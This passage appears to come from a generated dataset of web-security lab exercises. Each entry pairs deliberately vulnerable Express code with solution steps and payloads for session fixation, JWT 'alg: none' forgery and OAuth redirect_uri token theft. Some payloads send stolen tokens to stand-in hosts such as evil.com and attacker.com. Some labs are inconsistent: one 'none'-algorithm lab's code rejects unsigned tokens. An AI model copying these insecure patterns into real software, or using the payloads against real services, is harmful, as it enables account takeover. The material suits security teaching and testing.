    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const session = require('express-session'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'graphqlpass' }]; app.post('/graphql', (req, res) => { const { query, variables } = req.body; if (query.includes('mutation Login')) { const { username, password } = variables; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; return res.json({ data: { login: true } }); } } res.status(401).json({ error: 'Login failed' }); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') return res.send('Account details for carlos'); res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "{\"query\":\"mutation Login($username: String!, $password: String!) { login(username: $username, password: $password) }\",\"variables\":{\"username\":\"carlos\",\"password\":\"graphqlpass\"}}",
      "Cookie: session=attacker123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion with none in REST API",
    "Lab Description": "The REST API accepts JWTs but fails to enforce strong algorithm validation. An attacker can forge a token by setting the algorithm to 'none' and bypass signature verification. To solve: Log in as the admin user by crafting a JWT with alg=none and access the protected admin dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Postman to capture the valid JWT issued after login with your account.",
      "2.Decode the token using jwt.io or Burp decoder and note the 'alg' field in the header.",
      "3.Replace 'alg' with 'none', set 'sub' to 'admin', and remove the signature part.",
      "4.Re-encode the header and payload using base64url and reconstruct the token without a signature.",
      "5.Send the forged token to /admin with Authorization: Bearer <forged-token> and verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ sub: user.username }, 'supersecret'); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded?.header?.alg === 'none') { return res.send('Admin access granted'); } try { const verified = jwt.verify(token, 'supersecret'); if (verified.sub === 'admin') return res.send('Admin access granted'); } catch (e) {} res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"sub\":\"admin\"}",
      "Final Token: base64url(header) + '.' + base64url(payload) + '.'"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via referrer",
    "Lab Description": "The application uses OAuth implicit flow with access tokens returned in the URL fragment. Due to a misconfiguration, the redirect URI includes external domains, and the token leaks via the HTTP Referer header. To solve: Intercept Carlos’s token by injecting a malicious redirect_uri and reuse the token to access /user-info as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use OWASP ZAP to proxy the OAuth flow and initiate login using the victim's account.",
      "2.Modify the redirect_uri parameter to point to your attacker-controlled domain and capture the access_token from the URL fragment.",
      "3.Extract the access_token from the Referer header in requests made to your server.",
      "4.Use Postman to send GET /user-info with Authorization: Bearer <stolen-token>.",
      "5.Confirm that the token grants access to Carlos's user data and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { 'carlos': 'token-carlos-123' }; app.get('/oauth/authorize', (req, res) => { const { response_type, client_id, redirect_uri, state } = req.query; if (response_type === 'token') { const token = tokens['carlos']; res.redirect(`${redirect_uri}#access_token=${token}&state=${state}`); } else { res.status(400).send('Invalid request'); } }); app.get('/user-info', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; if (auth === 'token-carlos-123') return res.send('User info: carlos'); res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "https://auth.example.com/oauth/authorize?response_type=token&client_id=client123&redirect_uri=https://evil.com/steal&state=xyz",
      "Authorization: Bearer token-carlos-123"
    ]
  },
  {
    "Lab scenario": "Session Fixation in login endpoint with pre-set cookies",
    "Lab Description": "This lab is vulnerable to session fixation. The application assigns session tokens before authentication and accepts them post-login without regeneration. An attacker can trick a victim into using a known session ID, then log in with that session and hijack their account. To solve: Hijack Carlos's session and access his My Account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite Proxy to capture the initial GET /login request and note that a session cookie is issued prior to authentication.",
      "2. Replay the request with a manually set session cookie (e.g., 'session=attackersession') and confirm it's accepted.",
      "3. Send a crafted link to the victim containing the pre-set session cookie (simulate victim opening it in browser).",
      "4. Log in using Carlos’s credentials while reusing the fixed session ID (attackersession).",
      "5. Once the victim logs in with that session ID, access /my-account using the same session to verify hijacked access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const users = [{ username: 'carlos', password: 's3cr3t' }]; const sessions = {}; app.get('/login', (req, res) => { let sid = req.cookies.session || Math.random().toString(36).slice(2); res.cookie('session', sid); res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.session] = username; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send(`Account: ${user}`); } else { res.send('Not logged in'); } }); app.listen(4000);",
    "payloads": [
      "GET /login HTTP/1.1\\nCookie: session=attackersession",
      "POST /login HTTP/1.1\\nCookie: session=attackersession\\nusername=carlos&password=s3cr3t",
      "GET /my-account HTTP/1.1\\nCookie: session=attackersession"
    ]
  },
  {
    "Lab scenario": "JWT Tampering in Authorization Header using None algorithm",
    "Lab Description": "The application uses JWTs for session management but fails to enforce the use of strong algorithms. The server accepts tokens signed with 'none', effectively disabling signature verification. To solve: Modify a JWT to impersonate Carlos and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture a JWT from your own authenticated request using Postman or Burp.",
      "2. Decode the JWT using jwt.io or another decoder and modify the payload to {\"user\":\"carlos\"}.",
      "3. Change the 'alg' field in the header from 'HS256' to 'none'.",
      "4. Remove the signature portion and recombine header.payload.",
      "5. Replay the modified token in the Authorization: Bearer header and access /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('Forbidden'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload && decoded.payload.user === 'carlos') { res.send('Welcome admin carlos'); } else { res.status(403).send('Access denied'); } }); app.listen(4001);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"user\":\"carlos\"}",
      "JWT: base64url(header).base64url(payload).(no signature)",
      "Authorization: Bearer [crafted JWT]"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in callback endpoint",
    "Lab Description": "The application integrates OAuth but doesn't properly validate the redirect_uri. This allows an attacker to redirect tokens to an attacker-controlled domain. To solve: Leak Carlos’s OAuth token using a crafted authorization URL, then use it to access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp to intercept the /auth/login OAuth redirection and examine the redirect_uri parameter.",
      "2. Create a malicious redirect_uri pointing to your server (e.g., https://attacker.com/catch?token=).",
      "3. Craft a link to: /auth/login?redirect_uri=https://attacker.com/catch.",
      "4. Simulate Carlos clicking the link and authorize the app — the token is leaked to your server.",
      "5. Use the stolen token as Bearer in Authorization header to access /profile endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const tokens = { 'carlos': 'abc123carlos-token' }; app.get('/auth/login', (req, res) => { const redirectUri = req.query.redirect_uri; const user = 'carlos'; const token = tokens[user]; const redirectWithToken = `${redirectUri}?token=${token}`; res.redirect(redirectWithToken); }); app.get('/profile', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; if (Object.values(tokens).includes(token)) { res.send('Carlos Profile Accessed'); } else { res.status(403).send('Invalid token'); } }); app.listen(4002);",
    "payloads": [
      "/auth/login?redirect_uri=https://attacker.com/catch",
      "GET https://attacker.com/catch?token=abc123carlos-token",
      "Authorization: Bearer abc123carlos-token"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in token verification endpoint",
    "Lab Description": "The application uses JWT for authentication but improperly trusts the 'alg' field in incoming tokens. It accepts 'none' algorithm tokens without verifying their signature. The application exposes a /verify endpoint that decodes the token without validating its authenticity. To solve: Forge a JWT with 'alg':'none' to impersonate Carlos and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid login request using Burp Suite and extract the JWT from the Authorization header.",
      "Decode the JWT using jwt.io or Burp Decoder and analyze the payload structure.",
      "Modify the token header to {\"alg\":\"none\"} and set the payload to {\"username\":\"carlos\"}, remove the signature part entirely.",
      "Send the modified token using Postman or Repeater in the Authorization header to the /verify endpoint and ensure it returns user info for Carlos.",
      "Access the /my-account endpoint using the forged token to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', role: 'user' }]; app.post('/verify', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload && decoded.payload.username) { res.send(`Welcome ${decoded.payload.username}`); } else { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Alg Confusion Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "Session fixation through predictable token parameter",
    "Lab Description": "The application supports login sessions via a GET token parameter that is reflected as a session ID cookie. This behavior is vulnerable to session fixation. The attacker can set a predefined token value and trick the victim into using it. To solve: Fix a session ID and get Carlos to log in using it, then access /my-account as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Visit /login?token=attacker-session and observe that the session cookie is set to 'attacker-session'.",
      "Send Carlos a crafted phishing link using the same token: /login?token=attacker-session.",
      "Once Carlos logs in via that URL, the session remains tied to the token 'attacker-session'.",
      "Reuse the fixed session token by sending it as a cookie: Cookie: session=attacker-session to /my-account.",
      "Confirm access to Carlos’s account and verify with account data returned from the endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const token = req.query.token; if (token) { sessions[token] = 'carlos'; res.cookie('session', token); res.send('Login page loaded'); } else { res.send('Missing token'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') { res.send('Welcome back, carlos'); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "/login?token=attacker-session",
      "Cookie: session=attacker-session"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allowing token reuse",
    "Lab Description": "The application implements OAuth 2.0 login with a misconfigured redirect_uri and access_token reuse logic. An attacker can obtain a valid token meant for a benign user and replay it against privileged APIs without scope validation. To solve: Replay Carlos’s access token against the /account-info endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture the OAuth flow when logging in with your own account and record the redirect_uri and access_token.",
      "Alter the redirect_uri to a domain you control, observe that the authorization server accepts arbitrary URIs.",
      "Reconstruct the authorization code exchange manually to extract a token for Carlos by modifying the state parameter to impersonate him.",
      "Replay the access_token against /account-info by adding Authorization: Bearer <token>.",
      "Confirm account ownership by extracting Carlos’s data from the JSON response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.json()); const tokens = { 'abc123-token': 'carlos' }; app.get('/account-info', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (tokens[token]) { res.json({ user: tokens[token], email: tokens[token] + '@example.com' }); } else { res.status(403).send('Invalid access token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Token Reuse Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Authorization: Bearer abc123-token",
      "GET /account-info HTTP/1.1"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Predictable Session Token in Login Flow",
    "Lab Description": "The application uses predictable session tokens set before authentication. Upon successful login, the session identifier is not rotated, allowing session fixation. An attacker can force a victim to use a known session and hijack it after login. To solve: Fixate the session, get the victim to log in, and access their account using the same session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the initial GET /login request and note the session cookie value.",
      "Send the session cookie to the victim (assumed click on malicious link).",
      "Instruct the victim (simulate) to log in with valid credentials while using the attacker-fixed session.",
      "Use Burp Repeater with the same session ID and access /my-account.",
      "Confirm session hijack and successful access to the victim's authenticated page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'supersecret' }]; app.get('/login', (req, res) => { const sid = 'session_' + Math.floor(Math.random() * 1000); res.cookie('session', sid); sessions[sid] = { authenticated: false }; res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); if (!sessions[sid]) return res.status(400).send('Session not found'); sessions[sid].authenticated = true; sessions[sid].user = username; res.send('Welcome!'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid] && sessions[sid].authenticated) return res.send(`Account page for ${sessions[sid].user}`); res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "Force victim to use session_id=session_123",
      "Access /my-account with same session after victim login"
    ]
  },
  {
    "Lab scenario": "JWT Signature None Bypass in REST Login Flow",
    "Lab Description": "The application uses JWT for authentication but accepts tokens with the 'alg' field set to 'none'. This enables an attacker to forge tokens and gain unauthorized access. To solve: Craft a JWT with alg=none and impersonate Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to capture a valid JWT after logging in with a known user.",
      "Decode the JWT using jwt.io or Burp Decoder to inspect header/payload.",
      "Craft a new token with header {\"alg\":\"none\"} and payload {\"user\":\"carlos\"}.",
      "Remove the signature portion and send request with Authorization: Bearer <unsigned token>.",
      "Access /account endpoint as Carlos to confirm successful bypass."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', password: 'jwtpass' }]; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); const token = jwt.sign({ user: username }, 'secret'); res.json({ token }); }); app.get('/account', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; try { const payload = jwt.verify(token, 'secret'); res.send(`Hello ${payload.user}`); } catch { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\"}, Payload: {\"user\":\"carlos\"}",
      "Authorization: Bearer <base64(header).base64(payload)>"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration with Open Redirect Token Theft",
    "Lab Description": "This application uses OAuth to delegate authentication. The 'redirect_uri' parameter is not properly validated, allowing attackers to redirect authorization codes to attacker-controlled endpoints. To solve: Steal Carlos's token via crafted redirect and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to initiate OAuth flow and intercept redirect_uri in authorization request.",
      "Modify the redirect_uri to attacker.com/callback and forward the request.",
      "Simulate victim login to OAuth provider using Carlos's credentials (pre-known).",
      "Capture authorization code on attacker's server at /callback.",
      "Exchange stolen code for access_token via POST to /oauth/token.",
      "Use access_token in GET /profile endpoint to access Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const axios = require('axios'); const app = express(); const clients = [{ client_id: '123', client_secret: 'abc', redirect_uri: 'http://trusted.com/callback' }]; const users = [{ username: 'carlos', password: 'oauthpass' }]; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const client = clients.find(c => c.client_id === client_id); if (!client) return res.status(400).send('Unknown client'); const authCode = 'code1234'; const redirect = `${redirect_uri}?code=${authCode}&state=${state}`; res.redirect(redirect); }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'code1234') return res.json({ access_token: 'token_carlos' }); res.status(400).send('Invalid code'); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token_carlos') return res.send('Carlos private profile'); res.status(401).send('Unauthorized'); }); app.listen(5000);",
    "payloads": [
      "GET /auth?client_id=123&redirect_uri=http://attacker.com/callback&state=xyz",
      "Intercepted code=code1234, exchange with POST /token",
      "Authorization: Bearer token_carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation via login flow cookie persistence",
    "Lab Description": "The application improperly reuses session identifiers during the authentication process. Instead of generating a new session after a successful login, it maintains the same session ID issued pre-authentication. This flaw enables session fixation attacks where a malicious actor sets a session ID for the victim before they log in. To solve: Fixate Carlos’s session, log him in using the fixed session, then access his My Account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept initial GET /login using Burp Suite and capture the Set-Cookie header to obtain the session ID.",
      "Send this session ID to the victim via social engineering or iframe injection.",
      "Once the victim logs in using the fixed session ID, monitor the session on the attacker’s side using Burp.",
      "Replay the session using the fixed session ID in the Cookie header and access /account.",
      "Verify successful session fixation by accessing Carlos's data through /account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); let sessions = {}; let users = { carlos: 'letmein123' }; app.get('/login', (req, res) => { let sid = req.cookies.sid || Math.random().toString(36).slice(2); res.cookie('sid', sid); sessions[sid] = { authenticated: false }; res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; let sid = req.cookies.sid; if (users[username] && users[username] === password) { sessions[sid].authenticated = true; sessions[sid].user = username; return res.redirect('/account'); } res.status(403).send('Invalid credentials'); }); app.get('/account', (req, res) => { let sid = req.cookies.sid; if (sessions[sid] && sessions[sid].authenticated) { return res.send('Account page for ' + sessions[sid].user); } res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "GET /login --> Extract sid cookie",
      "POST /login with sid=attacker_fixed_sid --> Login with known credentials",
      "GET /account with sid=attacker_fixed_sid --> Access victim account"
    ]
  },
  {
    "Lab scenario": "JWT tampering due to 'none' algorithm vulnerability",
    "Lab Description": "This application accepts JWTs to authorize user access but fails to verify the signature if the algorithm is set to 'none'. This allows an attacker to forge arbitrary tokens and impersonate any user. To solve: Forge a JWT for Carlos by modifying the algorithm to 'none' and injecting the token into an authenticated request.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a request containing a valid JWT after logging in as a normal user.",
      "Decode the JWT using jwt.io or similar tools and observe the header and payload.",
      "Modify the header to use {\"alg\":\"none\"} and change the payload to {\"user\":\"carlos\"}.",
      "Remove the signature portion entirely and re-encode the token.",
      "Send the modified token in the Authorization: Bearer header to access /account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'secretkey'; app.get('/account', (req, res) => { let token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(401).send('No token'); try { const payload = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (payload.user === 'carlos') { return res.send('Carlos account data'); } else { return res.send('Generic user data'); } } catch (err) { return res.status(403).send('Invalid token'); } }); app.listen(4001);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"user\":\"carlos\"}",
      "JWT: base64url(header).base64url(payload). (no signature)",
      "Authorization: Bearer [forged_token]"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect in redirect_uri",
    "Lab Description": "The OAuth implementation allows arbitrary redirection via a vulnerable redirect_uri parameter, enabling an attacker to hijack the authorization code. To solve: Craft a malicious redirect_uri that steals the authorization code for Carlos’s account, then exchange the code for an access token and access /account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to initiate the OAuth flow and observe the redirect_uri parameter in the authorization URL.",
      "Modify the redirect_uri to point to your controlled server and URL-encode it.",
      "Send the modified URL to Carlos and capture the authorization code when he authenticates.",
      "Exchange the captured code with a POST request to /oauth/token to retrieve an access token.",
      "Use the token to access the protected resource /account with Authorization: Bearer."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const codes = {}; const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; if (!client_id || !redirect_uri) return res.status(400).send('Missing parameters'); const code = Math.random().toString(36).substring(2); codes[code] = 'carlos'; res.redirect(redirect_uri + '?code=' + code + '&state=' + state); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (codes[code]) { const token = Math.random().toString(36).substring(2); tokens[token] = codes[code]; return res.json({ access_token: token }); } res.status(403).send('Invalid code'); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (tokens[token] === 'carlos') return res.send('Carlos private account'); res.status(403).send('Access denied'); }); app.listen(4002);",
    "payloads": [
      "https://vulnerable.app/authorize?client_id=xyz&redirect_uri=https://attacker.com/callback&state=abc",
      "Intercept: GET /callback?code=stolen_code",
      "POST /oauth/token with code=stolen_code",
      "GET /account with Authorization: Bearer [access_token]"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Predictable Session Token in Login Flow",
    "Lab Description": "The application initializes a session token before login and fails to regenerate it post-authentication. The session token is predictable and does not get invalidated upon user login. To solve: Force a victim user (Carlos) to use a session ID you control, then access their account post-login.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to capture the GET /login request and note the Set-Cookie response with session ID.",
      "2. Observe that the session ID remains unchanged before and after successful login.",
      "3. In Burp Repeater, generate a session ID manually and craft a phishing link with a preset session cookie.",
      "4. Simulate the victim logging in using the session ID you created.",
      "5. Replay the session ID in your browser to access Carlos's account page after login."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'secret123', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\" action=\"/login\">User: <input name=\"username\"/>Pass: <input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.redirect('/account'); } else { res.send('Invalid credentials'); } }); app.get('/account', (req, res) => { if (req.session.user === 'carlos') { res.send('Account page of Carlos'); } else { res.send('Not authorized'); } }); app.listen(3000);",
    "payloads": [
      "Set-Cookie: connect.sid=attacker-session; path=/; HttpOnly",
      "GET /login with crafted session",
      "Phish URL using attacker session",
      "Replay session after victim login"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Attack in API Authorization",
    "Lab Description": "The application's backend validates JWTs but does not enforce the algorithm used for signature verification. It trusts the 'alg' value in the JWT header. To solve: Forge a valid token for Carlos using 'none' algorithm and access his user dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture a legitimate JWT after login via Burp Suite.",
      "2. Decode the JWT using jwt.io and observe the alg: HS256 header.",
      "3. Replace alg with none and set the payload sub to carlos.",
      "4. Remove the JWT signature part completely.",
      "5. Use Postman to send the forged token in Authorization header and access /dashboard."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const secret = 'jwtsecretkey'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === '1234') { const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid'); } }); app.get('/dashboard', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); if (payload.sub === 'carlos') return res.send('Carlos Dashboard'); } try { const verified = jwt.verify(token, secret); if (verified.sub === 'carlos') res.send('Carlos Dashboard'); else res.status(403).send('Unauthorized'); } catch (e) { res.status(403).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "{ \"alg\": \"none\", \"typ\": \"JWT\" }",
      "{ \"sub\": \"carlos\" }",
      "Header.Payload.",
      "Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration - Trusting Unvalidated Redirect URIs",
    "Lab Description": "The OAuth provider implementation improperly accepts arbitrary redirect_uri values during the authorization flow. This allows malicious manipulation of the final redirect destination. To solve: Hijack Carlos’s OAuth session to leak his token via open redirect.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to observe the /auth endpoint in the OAuth flow.",
      "2. Modify the redirect_uri parameter to point to an attacker-controlled site.",
      "3. Send the manipulated OAuth link to Carlos (simulate or assume session capture).",
      "4. Upon OAuth login, the token is sent to the attacker domain.",
      "5. Use the leaked token in Postman to access Carlos’s account via API."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const users = { 'carlos': { password: 'abc123', token: 'token-carlos' } }; app.get('/auth', (req, res) => { const { redirect_uri, response_type, client_id } = req.query; if (!redirect_uri || !client_id || !response_type) return res.status(400).send('Invalid request'); const token = users['carlos'].token; const redirect = `${redirect_uri}?access_token=${token}`; res.redirect(redirect); }); app.get('/resource', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === users['carlos'].token) res.send('Sensitive data of Carlos'); else res.status(403).send('Invalid token'); }); app.listen(5000);",
    "payloads": [
      "GET /auth?client_id=123&response_type=token&redirect_uri=https://attacker.site/callback",
      "OAuth token leak via attacker.site",
      "Authorization: Bearer token-carlos",
      "GET /resource with hijacked token"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Attack in Authorization Header",
    "Lab Description": "This lab uses JWT for session management with a misconfigured JWT verification logic. The application decodes the JWT token provided in the Authorization header and fails to verify the signature when the 'alg' header is set to 'none'. To solve: forge a valid-looking JWT token for the admin user using 'none' algorithm and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture the Authorization: Bearer <JWT> header after logging in using Burp Suite.",
      "Decode the JWT using jwt.io and inspect the algorithm and payload structure.",
      "Modify the JWT header to use \"alg\": \"none\" and payload to {\"user\": \"admin\"}, remove the signature.",
      "Send the modified JWT as Authorization header using Postman or Burp Repeater.",
      "Access /admin-dashboard to verify successful access with forged token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const users = [{ username: 'admin', role: 'admin' }, { username: 'user', role: 'user' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.user === 'admin') return res.send('Admin Access Granted'); } try { const verified = jwt.verify(token, 'secretkey'); if (verified.user === 'admin') return res.send('Admin Access Verified'); } catch (err) { return res.status(403).send('Invalid token'); } res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    ]
  },
  {
    "Lab scenario": "Session Fixation via Login Flow in GraphQL",
    "Lab Description": "The application handles session identifiers insecurely via GraphQL mutations. It fails to regenerate session tokens upon successful login. An attacker can fix their session ID, trick a victim into logging in, and then hijack the authenticated session. To solve: fix a session ID before victim login, capture their session, and access their dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a GraphQL login mutation and observe Set-Cookie header using Burp Suite.",
      "Inject a known session ID using Cookie header and ensure it's accepted pre-login.",
      "Use CSRF or social engineering to force victim login with attacker-fixed session ID.",
